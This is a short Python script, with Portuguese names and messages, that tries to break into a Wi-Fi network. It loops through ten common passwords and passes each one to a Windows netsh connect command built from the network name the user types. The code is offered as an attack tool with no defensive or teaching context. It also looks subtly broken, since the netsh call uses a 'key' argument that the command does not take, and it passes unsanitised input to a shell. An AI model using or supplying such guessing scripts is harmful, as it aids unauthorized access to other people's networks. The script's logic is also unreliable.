from subprocess import Popen, PIPE, call
from time import sleep
import string

def testar(nome, senha):
    try:
        comando = f'netsh wlan connect name="{nome}" key="{senha}"'
        manipulador = Popen(comando, shell=True, stdout=PIPE, stderr=PIPE)

        stdout, stderr = manipulador.communicate()

        if "conectado" in stdout.decode('utf-8').lower():
            print('Conectado')
            print(f"Esta é a senha: {senha}")
            exit()
        else:
            print(f"{senha} não é a senha")
            return False
    except Exception as e:
        print(f"Ocorreu um erro ao tentar a senha {senha}: {e}")
        return False

print('Digite o nome da rede Wi-Fi:')
nome = input().strip()

senhas_comuns = [
    '12345678', 'password', '123456789', '1234567', '123456',
    '12345', '1234567890', 'qwerty', 'abcdef', 'abc123'
]


pausa = 1

for senha in senhas_comuns:
    testar(nome, senha)
    sleep(pausa)
